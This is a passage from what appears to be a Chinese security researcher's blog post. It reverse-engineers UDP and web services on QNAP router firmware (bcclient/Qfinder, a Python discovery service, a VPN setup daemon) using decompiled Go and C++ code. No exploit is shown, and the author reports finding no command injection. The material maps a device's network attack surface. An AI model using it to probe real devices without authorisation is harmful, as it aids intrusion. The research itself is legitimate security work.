local_c;</span><br><span class="line">  undefined4 local_8;</span><br><span class="line">  undefined4 local_4;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* /home/adv/adv-release-bsp/src/rapid/store/collection.go:94 */</span></span><br><span class="line">  <span class="keyword">while</span> (&amp;stack0x00000000 &lt;= *(undefined **)(unaff_r10 + <span class="number">8</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* /home/adv/adv-release-bsp/src/rapid/store/collection.go:94 */</span></span><br><span class="line">    runtime.morestack_noctxt();</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* /home/adv/adv-release-bsp/src/rapid/store/collection.go:95 */</span></span><br><span class="line">  runtime.duffzero_0x0_0x14_FUN_0006a04c((uint4 *)&amp;local_14,<span class="number">0</span>);</span><br><span class="line">  local_14 = gitlab.lionic.com/qnap/rapid/store.(*Collection).Replace.func1;</span><br><span class="line">  local_10 = param_1;</span><br><span class="line">  local_c = param_2;</span><br><span class="line">  local_8 = param_3;</span><br><span class="line">  local_4 = param_4;</span><br><span class="line">  github.com/boltdb/bolt.(*DB).Update(*param_1,&amp;local_14,in_stack_ffffffe4,in_stack_ffffffe8);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>可以看到使用<code>github.com/boltdb/bolt.(*DB).Update</code>保存了数据, 这也是我第一次接触这种Key&#x2F;Value的数据存储.</p>
</blockquote>
<blockquote>
<p>在这个服务的最后, 还有几个点说一下</p>
</blockquote>
<ol>
<li>可能在其他的地方查询了保存数据, 并进行了危险操作.</li>
<li>我简单的查看了<code>rapid</code>没有找到明显的命令注入.</li>
<li>在这个程序中还有许多路由可以访问但是我没有找到对应的请求的程序</li>
</ol>
<h3 id="bcclient-Qfinder的服务端"><a href="#bcclient-Qfinder的服务端" class="headerlink" title="bcclient Qfinder的服务端"></a>bcclient Qfinder的服务端</h3><blockquote>
<p>这个服务应该是每一个qnap的产品都会有的服务,但是貌似并不在WAN口开放, 并且每一个产品的不同程序也会有不同, 分析了客户端程序会发现许多url路径, 而在开放的8097端口使用的同样是Golang开发的程序, 我们简单的来看一下代码吧</p>
</blockquote>
<blockquote>
<p>在Golang中<code>readFromUDP()</code>函数负责接收数据，而<code>WriteToUDP()</code>函数负责返回.我们直接在ghidra中搜索这两个函数很快就能够看到在<code>bcclient/internal/qfindgo.(*QFAgent).reactloop</code>中调用了<code>readFromUDP</code>函数简单的看一下</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">      net.(*UDPConn).readFromUDP</span><br><span class="line">                (param_2,puVar12,<span class="number">100</span>,<span class="number">100</span>,pprVar18,puVar19,puVar20,uVar6,in_stack_fffffffffffffd98)</span><br><span class="line">      ;</span><br><span class="line">          ...</span><br><span class="line">  <span class="keyword">if</span> (uStack_260._6_1_ == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">                  <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:424 */</span></span><br><span class="line">    <span class="keyword">if</span> (((DAT_002a4898 == <span class="number">6</span>) &amp;&amp; (*(<span class="type">int</span> *)goss_router_2a4890 == <span class="number">0x74756f72</span>)) &amp;&amp;</span><br><span class="line">       (*(<span class="type">short</span> *)(goss_router_2a4890 + <span class="number">4</span>) == <span class="number">0x7265</span>)) &#123;</span><br><span class="line">      lVar15 = <span class="number">0</span>;</span><br><span class="line">                  <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:426 */</span></span><br><span class="line">      <span class="keyword">while</span> (puVar10 = puVar12, in_stack_fffffffffffffd90 = uVar6, lVar15 &lt; local_250) &#123;</span><br><span class="line">        local_198 = local_1b0[lVar15];</span><br><span class="line">        local_248 = lVar15;</span><br><span class="line">                  <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:427 */</span></span><br><span class="line">        net.(*UDPAddr).String(local_190,puVar4,puVar12);</span><br><span class="line">        strings.genSplit(puVar4,puVar12,<span class="number">0x19554c</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0xffffffffffffffff</span>,puVar20,uVar6,</span><br><span class="line">                         in_stack_fffffffffffffd98);</span><br><span class="line">                  <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:427 */</span></span><br><span class="line">        <span class="keyword">if</span> (uVar6 == <span class="number">0</span>) &#123;</span><br><span class="line">                  <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:427 */</span></span><br><span class="line">          runtime.panicIndex(puVar4,puVar12);</span><br><span class="line">          <span class="keyword">goto</span> LAB_00149458;</span><br><span class="line">        &#125;</span><br><span class="line">        puVar4 = puVar13;</span><br><span class="line">        puVar12 = puVar10;</span><br><span class="line">        net.ParseIP(*puVar20,puVar20[<span class="number">1</span>],puVar13,puVar10,pprVar18);</span><br><span class="line">        net.(*IPNet).Contains(local_198,puVar4,puVar12,pprVar18,pprVar18); <span class="comment">//[1]</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">char</span>)pprVar18 != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">                  <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:428 */</span></span><br><span class="line">          github.com/sirupsen/logrus.(*Logger).Logf</span><br><span class="line">                    (local_1c8,CONCAT44((<span class="type">int</span>)uVar16,<span class="number">4</span>),&amp;DAT_0019f6fa,<span class="number">0x31</span>,pprVar18,<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line">          puVar4 = local_190;</span><br><span class="line">                  <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:429 */</span></span><br><span class="line">          bcclient/internal/qfindgo.(*QFAgent).regularReport(param_1,local_190); <span class="comment">//[2]</span></span><br><span class="line">        &#125;</span><br><span class="line">                  <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:426 */</span></span><br><span class="line">        lVar15 = local_248 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:433 */</span></span><br><span class="line">      bcclient/internal/qfindgo.(*QFAgent).regularReport(param_1,local_190); <span class="comment">//[3]</span></span><br><span class="line">      puVar10 = puVar12;</span><br><span class="line">      in_stack_fffffffffffffd90 = uVar6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>可以看到最后都在[2],[3]处调用了<code>regularReport</code>,而[1]处貌似使用<code>Contains</code>函数去检查了Ip, 让我们进入到<code>regularReport</code>函数</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> bcclient/internal/qfindgo.(*QFAgent).regularReport(<span class="type">long</span> param_1,undefined8 param_2)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:348 */</span></span><br><span class="line">  <span class="keyword">while</span> (&amp;stack0x00000000 &lt;= *(undefined **)(unaff_x28 + <span class="number">0x10</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:348 */</span></span><br><span class="line">    runtime.morestack_noctxt();</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:349 */</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">long</span> *)(param_1 + <span class="number">0x18</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:353 */</span></span><br><span class="line">    bcclient/internal/qfindgo.(*QFAgent).mkreplypkt</span><br><span class="line">              (param_1,in_stack_ffffffffffffffb0,in_stack_ffffffffffffffb8,in_stack_ffffffffffffffc0</span><br><span class="line">              ); <span class="comment">//[1]</span></span><br><span class="line">    bcclient/internal/qfindgo.(*QFAgent).doreply</span><br><span class="line">              (param_1,*(undefined8 *)(param_1 + <span class="number">0x18</span>),in_stack_ffffffffffffffb0,</span><br><span class="line">               in_stack_ffffffffffffffb8,in_stack_ffffffffffffffc0,param_2); <span class="comment">//[2]</span></span><br><span class="line">                    <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:354 */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:350 */</span></span><br><span class="line">  local_18 = &amp;datatype.String.<span class="built_in">string</span>;</span><br><span class="line">  local_10 = &amp;goss_qfindgo_1c8188;</span><br><span class="line">                    <span class="comment">/* github.com/sirupsen/logrus@v1.9.0/logger.go:186 */</span></span><br><span class="line">  github.com/sirupsen/logrus.(*Logger).Logf</span><br><span class="line">            (DAT_002ac468,CONCAT44((<span class="type">int</span>)((ulong)in_stack_ffffffffffffffb0 &gt;&gt; <span class="number">0x20</span>),<span class="number">2</span>),&amp;DAT_0019c999,</span><br><span class="line">             <span class="number">0x21</span>,&amp;local_18,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">                    <span class="comment">/* bcclient/internal/qfindgo/qfagent.go:351 */</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>进入到<code>regularReport</code>函数, 在[1]中并没有我感兴趣的并且貌似我们的param_2也没有传入函数中, 所以进入到<code> bcclient/internal/qfindgo.(*QFAgent).doreply</code>函数.</p>
</blockquote>
<blockquote>
<p><code> bcclient/internal/qfindgo.(*QFAgent).doreply</code>函数的伪代码非常杂乱, 所以简单描述一下吧,在这个函数中获取了非常多的系统信息有以下函数, 如果对于这个函数是怎么运行的师傅可以考虑自己看一下, 并在这个函数中使用<code>net.(*UDPConn).WriteToUDP</code>函数返回了数据</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bcclient/internal/common.GetModelName()</span><br><span class="line"></span><br><span class="line">bcclient/internal/common.GetCorrectInterface()</span><br><span class="line"></span><br><span class="line">bcclient/internal/qfindgo.(*QFAgent).updateSystemInfo()</span><br><span class="line"></span><br><span class="line">bcclient/internal/qfindgo.(*QFAgent).SetWLIPs()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结这个服务, 由于每一个设备的web服务和功能点不同所以可能bcclient将会有很大的差异, 而我了解到的通过分析Qfinder, 如果我尝试通过添加一个公网的设备他将会从web服务获取设备信息, 当然我尝试点击其他的功能点的时候客户端将会跳到浏览器, 暂时无法确定是否是公网的原因还是其他? 而通过分析bcclient程序也只能看到获取设备信息的函数, 至于这个<code>SetWLIPs()</code>函数进入后就可以看到<code>net.ParseIP()</code>函数并没有什么敏感操作, Qfinder客户端服务功能还是相当多的, 可能会在其他设备上找到更多?</p>
</blockquote>
<h3 id="8099-python"><a href="#8099-python" class="headerlink" title="8099-python"></a>8099-python</h3><blockquote>
<p>这个服务我还没有怎么看过, 所以我应该会边看边写这个服务, 可以看到是由<code>/usr/sbin/qfinderDiscovery.pyc</code>去打开的服务, 接下来我们就可以去看python代码了(太好了!至少不是那该死的golang的伪代码了)当看到这个文件名称时我想这个怎么说也会和上一个服务有点关系, 现在还有一个问题为什么会有一个类似于qfinder的客户端会出现在路由器上? 可能是某一个可以安装的插件?</p>
</blockquote>
<blockquote>
<p>看完后我现在敢肯定这就是一个python写的缩小版的qfinder, 在接收来自上面bcclient返回的数据后，解析数据包并保存在<code>redis</code>中.</p>
</blockquote>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_update_device_info_in_redis_db</span>(<span class="params">device_info_list</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = redis.StrictRedis(host=redis_host_ip, port=redis_port, db=redis_index)</span><br><span class="line">        <span class="keyword">for</span> dev <span class="keyword">in</span> device_info_list:</span><br><span class="line">            <span class="keyword">if</span> dev[<span class="string">&#x27;macAddr&#x27;</span>] != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                r.hset(dev[<span class="string">&#x27;macAddr&#x27;</span>], <span class="string">&#x27;category&#x27;</span>, dev[<span class="string">&#x27;category&#x27;</span>])</span><br><span class="line">                r.hset(dev[<span class="string">&#x27;macAddr&#x27;</span>], <span class="string">&#x27;macAddr&#x27;</span>, dev[<span class="string">&#x27;macAddr&#x27;</span>])</span><br><span class="line">                r.hset(dev[<span class="string">&#x27;macAddr&#x27;</span>], <span class="string">&#x27;ipList&#x27;</span>, dev[<span class="string">&#x27;ipList&#x27;</span>])</span><br><span class="line">                r.hset(dev[<span class="string">&#x27;macAddr&#x27;</span>], <span class="string">&#x27;lastSeen&#x27;</span>, dev[<span class="string">&#x27;lastSeen&#x27;</span>])</span><br><span class="line">                r.hset(dev[<span class="string">&#x27;macAddr&#x27;</span>], <span class="string">&#x27;model&#x27;</span>, dev[<span class="string">&#x27;model&#x27;</span>])</span><br><span class="line">                r.hset(dev[<span class="string">&#x27;macAddr&#x27;</span>], <span class="string">&#x27;name&#x27;</span>, dev[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">                r.hset(dev[<span class="string">&#x27;macAddr&#x27;</span>], <span class="string">&#x27;macList&#x27;</span>, dev[<span class="string">&#x27;macList&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(<span class="string">&#x27;_update_device_info_in_redis_db fail error = %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="quwan-wmd-7788"><a href="#quwan-wmd-7788" class="headerlink" title="quwan_wmd-7788"></a>quwan_wmd-7788</h3><blockquote>
<p>这个服务搜索官方的资料貌似是一个叫Hub-to-edge VPN的服务, 而它真正是在<code>libquwansetup.so.1.0</code>绑定和接收服务, 函数名称是<code>ProcUdp::udp_listen</code>, 进入我们的代码环节! 这一次我们用IDA Por, </p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( (<span class="built_in">recvfrom</span>(*((_DWORD *)<span class="keyword">this</span> + <span class="number">1</span>), v142, <span class="number">0x100uLL</span>, <span class="number">0</span>, &amp;v132, &amp;addr_len) &amp; <span class="number">0x8000000000000000LL</span>) != <span class="number">0</span> ) <span class="comment">//[1]</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sub_4C7A8</span>((<span class="type">int</span>)v141, v142);</span><br><span class="line">      <span class="built_in">sub_4C6DC</span>(&amp;v134, v141);</span><br><span class="line">      std::string::_M_dispose(v141);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)Json::Reader::<span class="built_in">parse</span>(v143, &amp;v134, v139, <span class="number">0LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">                  <span class="comment">//log print</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>((Json::Value *)v140, <span class="number">0</span>);</span><br><span class="line">      Json::Value::<span class="built_in">get</span>((Json::Value *)v139, <span class="string">&quot;Sender&quot;</span>, (<span class="type">const</span> Json::Value *)v140); <span class="comment">//[2]</span></span><br><span class="line">      v124 = Json::Value::<span class="built_in">asInt</span>((Json::Value *)v141);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v141);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v140);</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>((Json::Value *)v140, <span class="number">0</span>);</span><br><span class="line">      Json::Value::<span class="built_in">get</span>((Json::Value *)v139, <span class="string">&quot;Receiver&quot;</span>, (<span class="type">const</span> Json::Value *)v140); <span class="comment">//[3]</span></span><br><span class="line">      v35 = Json::Value::<span class="built_in">asInt</span>((Json::Value *)v141);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v141);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v140);</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>((Json::Value *)v140, <span class="number">0</span>);</span><br><span class="line">      Json::Value::<span class="built_in">get</span>((Json::Value *)v139, <span class="string">&quot;Wan&quot;</span>, (<span class="type">const</span> Json::Value *)v140); <span class="comment">//[4]</span></span><br><span class="line">      v129 = Json::Value::<span class="built_in">asInt</span>((Json::Value *)v141);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v141);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v140);</span><br><span class="line">      <span class="keyword">if</span> ( v124 )</span><br><span class="line">        v36 = v35 == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v36 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v36 )</span><br><span class="line">      &#123;</span><br><span class="line">              <span class="comment">//log print</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v126 != v35 )</span><br><span class="line">      &#123;</span><br><span class="line">           <span class="comment">//log print</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">      ipsec_intalled_num = <span class="built_in">get_ipsec_intalled_num</span>(); <span class="comment">//[5]</span></span><br><span class="line">      Json::FastWriter::<span class="built_in">FastWriter</span>((Json::FastWriter *)v141);</span><br><span class="line">      std::string::<span class="built_in">basic_string</span>(v137, &amp;log_target[abi:cxx11]);</span><br><span class="line">      <span class="built_in">check_file_size</span>(v137);</span><br><span class="line">                 <span class="comment">//log print</span></span><br><span class="line">      <span class="built_in">sub_4C7A0</span>(v67, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      std::string::_M_dispose(v140);</span><br><span class="line">      std::string::_M_dispose(v138);</span><br><span class="line">      std::string::_M_dispose(v137);</span><br><span class="line">      wan_port_num = <span class="built_in">get_wan_port_num</span>(); <span class="comment">//[6]</span></span><br><span class="line">      <span class="built_in">get_cpu_usage</span>(); <span class="comment">//[7]</span></span><br><span class="line">      v69 = v68;</span><br><span class="line">      <span class="built_in">get_mem_usage</span>(); <span class="comment">//[8]</span></span><br><span class="line">      v71 = v70;</span><br><span class="line">      std::string::<span class="built_in">basic_string</span>(v137, &amp;log_target[abi:cxx11]);</span><br><span class="line">      <span class="built_in">check_file_size</span>(v137);</span><br><span class="line">                      <span class="comment">//log print</span></span><br><span class="line">      <span class="built_in">sub_4C7A0</span>(v78, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      std::string::_M_dispose(v140);</span><br><span class="line">      std::string::_M_dispose(v138);</span><br><span class="line">      std::string::_M_dispose(v137);</span><br><span class="line">      std::string::<span class="built_in">basic_string</span>(v137, &amp;log_target[abi:cxx11]);</span><br><span class="line">      <span class="built_in">check_file_size</span>(v137);</span><br><span class="line">                 <span class="comment">//log print</span></span><br><span class="line">      <span class="built_in">sub_4C7A0</span>(v89, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      std::string::_M_dispose(v140);</span><br><span class="line">      std::string::_M_dispose(v138);</span><br><span class="line">      std::string::_M_dispose(v137);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)(v129 * wan_port_num + ipsec_intalled_num) &lt;= <span class="number">30</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v100 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        std::string::<span class="built_in">basic_string</span>(v137, &amp;log_target[abi:cxx11]);</span><br><span class="line">        <span class="built_in">check_file_size</span>(v137);</span><br><span class="line">        v90 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>&gt;(&amp;setup_logger, v138);</span><br><span class="line">        v91 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v90, <span class="string">&quot;[ERROR] &quot;</span>);</span><br><span class="line">        get_cur_time[abi:cxx11]();</span><br><span class="line">        v92 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>&gt;(v91, v140);</span><br><span class="line">        v93 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v92, <span class="string">&quot;Installed: &quot;</span>);</span><br><span class="line">        v94 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v93, ipsec_intalled_num);</span><br><span class="line">        v95 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v94, <span class="string">&quot;, it will be exceeded limitation: &quot;</span>);</span><br><span class="line">        v96 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v95, <span class="number">30LL</span>);</span><br><span class="line">        v97 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v96, <span class="string">&quot; after adding: &quot;</span>);</span><br><span class="line">        v98 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v97, v129 * wan_port_num);</span><br><span class="line">        v99 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v98, <span class="string">&quot; sessions.&quot;</span>);</span><br><span class="line">        <span class="built_in">sub_4C7A0</span>(v99, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        v100 = <span class="number">-2</span>;</span><br><span class="line">        std::string::_M_dispose(v140);</span><br><span class="line">        std::string::_M_dispose(v138);</span><br><span class="line">        std::string::_M_dispose(v137);</span><br><span class="line">      &#125;</span><br><span class="line">      v101 = Json::Value::<span class="keyword">operator</span>[](v139, <span class="string">&quot;Sender&quot;</span>);</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>((Json::Value *)v140, v126);</span><br><span class="line">      Json::Value::<span class="keyword">operator</span>=(v101, v140);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v140);</span><br><span class="line">      v102 = Json::Value::<span class="keyword">operator</span>[](v139, <span class="string">&quot;Receiver&quot;</span>);</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>((Json::Value *)v140, v124);</span><br><span class="line">      Json::Value::<span class="keyword">operator</span>=(v102, v140);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v140);</span><br><span class="line">      v103 = Json::Value::<span class="keyword">operator</span>[](v139, <span class="string">&quot;RemoteWan&quot;</span>);</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>((Json::Value *)v140, wan_port_num);</span><br><span class="line">      Json::Value::<span class="keyword">operator</span>=(v103, v140);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v140);</span><br><span class="line">      v104 = Json::Value::<span class="keyword">operator</span>[](v139, <span class="string">&quot;Cpu&quot;</span>);</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>((Json::Value *)v140, v83);</span><br><span class="line">      Json::Value::<span class="keyword">operator</span>=(v104, v140);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v140);</span><br><span class="line">      v105 = Json::Value::<span class="keyword">operator</span>[](v139, <span class="string">&quot;Memory&quot;</span>);</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>((Json::Value *)v140, v86);</span><br><span class="line">      Json::Value::<span class="keyword">operator</span>=(v105, v140);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v140);</span><br><span class="line">      v106 = Json::Value::<span class="keyword">operator</span>[](v139, <span class="string">&quot;Connections&quot;</span>);</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>((Json::Value *)v140, ipsec_intalled_num);</span><br><span class="line">      Json::Value::<span class="keyword">operator</span>=(v106, v140);</span><br><span class="line">      Json::Value::~<span 